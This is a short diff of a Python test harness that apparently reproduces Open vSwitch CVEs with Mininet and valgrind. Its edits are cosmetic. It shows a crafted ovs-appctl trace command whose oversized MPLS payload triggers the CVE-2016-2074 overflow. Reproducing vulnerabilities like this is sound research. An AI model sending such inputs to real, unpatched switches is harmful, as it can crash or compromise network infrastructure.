@@ -1,13 +1,13 @@
 import os
-import ovs_valgrind as ovs_valgrind
+import ovs_valgrind
 from mininet.log import setLogLevel
 from time import sleep
-from mininet_setup import  MininetNetwork
+from mininet_setup import MininetNetwork
 
 def cve_2016_2074():
     os.system('sudo ovs-vsctl add-br br0')
 
-    os.system(' ovs-appctl ofproto/trace br0 in_port=1 ffffffffffff0000000000008847$(for i in $(seq 512); do printf cccc; done)')
+    os.system('ovs-appctl ofproto/trace br0 in_port=1 ffffffffffff0000000000008847$(for i in $(seq 512); do printf cccc; done)')
 
     os.system('sudo ovs-vsctl del-br br0')
 
@@ -35,4 +35,5 @@ def cve_2016_10377():
     os.system('rm packets/cve_2016_10377')
 
 if __name__ == '__main__':
+    #cve_2016_2074()
     cve_2016_10377()
